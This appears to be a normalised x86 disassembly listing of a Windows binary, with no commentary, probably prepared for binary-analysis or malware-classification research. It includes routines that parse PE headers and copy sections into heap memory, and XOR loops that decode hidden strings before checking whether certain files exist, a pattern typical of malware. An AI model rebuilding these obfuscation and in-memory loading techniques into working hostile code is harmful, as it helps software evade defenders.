cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_1002d84e
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1005e672
push 0x80
mov eax sub_1008561a
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10013950
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10002fc0
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_10034a80
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_100101d0
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_100578b0
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_100578b0
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_100578b0
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_10069d0f
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_100578b0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1005a5dc
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_100405c0
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005a5dc
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001c121
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1005393c
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
xor eax eax
call sub_1004642f
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_100578b0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005a5dc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001c121
sub_1005ed70
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10058c50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1005eda0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
mov eax 0x5a4d
cmp [ esi ] ax
je r-xdata
push ebx
mov ebx [ esi + 0x3c ]
add ebx esi
cmp [ ebx ] 0x4550
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebx + 0x50 ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] eax
test eax eax
jne r-xdata
pop ebx
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn 0x8
push edi
mov edi eax
mov eax [ ebp + 0xc ]
mov ecx 0x10
[ edi ] [ esi ]
mov edi [ eax + 0x3c ]
add edi [ edx + 0x1c ]
mov ecx 0x3e
mov esi ebx
[ edi ] [ esi ]
mov eax [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x3c ]
add ecx eax
mov [ edx + 0x8 ] ecx
movzx esi [ ecx + 0x14 ]
movzx eax [ ebx + 0x14 ]
lea esi [ esi + ecx + 0x18 ]
mov [ ebp - 0x4 ] esi
xor esi esi
lea eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp si [ ecx + 0x6 ]
jae r-xdata
pop ebx
mov eax 0x3
pop esi
mov esp ebp
pop ebp
retn 0x8
pop edi
pop ebx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ebx [ edx + 0xc ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi eax
mov ecx 0xa
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
add eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
push eax
mov eax [ ecx + 0xc ]
add eax [ edx + 0x1c ]
push eax
call sub_1007f5d0
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x4 ]
add esp 0xc
cmp ecx eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x4 ]
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10035000
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
movzx edx [ ecx + 0x6 ]
mov eax 0x28
add [ ebp - 0x8 ] eax
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp eax edx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10035000
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebx ]
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_1005ef10
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_1005ef30
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff90
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff8b
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10038c00
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005efca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1005f050
push ebp
mov ebp esp
push 0xffffffff
push sub_10085074
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
call sub_1006a233
mov [ esi + 0x8 ] eax
call sub_1001706d
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_10034e98
mov eax [ edi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10069747
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0xc ] bl
xor eax eax
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] ax
push 0x10
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x48 ] bx
mov [ esi + 0x4a ] bl
call sub_1001f84c
mov edi eax
add esp 0x4
mov [ ebp - 0x10 ] edi
cmp edi ebx
je r-xdata
inc eax
mov [ edi + 0x4 ] eax
xor edi edi
mov [ edi + 0x4 ] ebx
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
mov [ edi ] r--data
call sub_100120f0
call sub_10059d69
lea ecx [ ebp - 0x38 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_1001c8b0
mov [ edi ] r--data
jmp r-xdata
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10022cc0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1005f150
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x26
call sub_100367b0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005f1e2
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10070e50
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1005f210
push ebp
mov ebp esp
push 0xffffffff
push sub_1008694b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_1006a0d0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_1005fbb8
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1005f2b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087d33
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xb8 ] r--data
mov [ ebp - 0xa8 ] r--data
mov [ ebp - 0x58 ] r--data
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ ebp - 0x10 ] 0x2
call sub_10069110
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp - 0xb8 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xa0 ]
push ecx
mov [ ebp + eax - 0xb8 ] r--data
call sub_10047250
mov [ ebp - 0xa0 ] r--data
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x60 ] ebx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1006dc30
mov ecx esi
lea eax [ ebp - 0xb8 ]
call sub_10068070
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x10 ] 0x3
mov [ ebp - 0x4 ] bl
call sub_10013a20
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1005f3a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_1005f410
push ebp
mov ebp esp
push 0xffffffff
push sub_10088881
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x304 ] edi
mov [ ebp - 0x308 ] eax
mov ebx ecx
mov [ ebp - 0x324 ] edi
mov [ ebp - 0x320 ] edi
mov [ ebp - 0x31c ] edi
mov ecx 0x7
mov edx 0x1
mov [ ebp - 0x4 ] edx
xor esi esi
mov [ ebp - 0x2e4 ] ecx
mov [ ebp - 0x2c8 ] ecx
mov [ ebp - 0x2a8 ] ecx
mov [ ebp - 0x28c ] ecx
xor ecx ecx
mov [ ebp - 0x2e8 ] edi
mov [ ebp - 0x2f8 ] si
mov [ ebp - 0x2cc ] edi
mov [ ebp - 0x2dc ] si
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2bc ] si
mov [ ebp - 0x290 ] edi
mov [ ebp - 0x2a0 ] cx
mov [ ebp - 0x4 ] 0x2
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
push edx
mov [ ebp - 0x304 ] edx
push edi
lea edx [ ebp - 0x2fc ]
push edx
mov ecx ebx
mov [ ebp - 0x2fc ] 0x3b
call sub_100075f0
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov al [ ebp + 0xc ]
mov ecx [ r--data ]
mov [ ebp - 0x2fc ] al
mov [ ebp - 0x300 ] 0x1
xor eax eax
mov [ ebp - 0x2fc ] 0x3b
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa4
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0x1d
jb r-xdata
mov ecx [ ebp - 0x304 ]
mov ebx [ ebp - 0x324 ]
mov edi [ ebp - 0x320 ]
push ecx
xor eax eax
push ebx
mov ecx edi
mov [ ebp - 0x12 ] ax
call sub_10038320
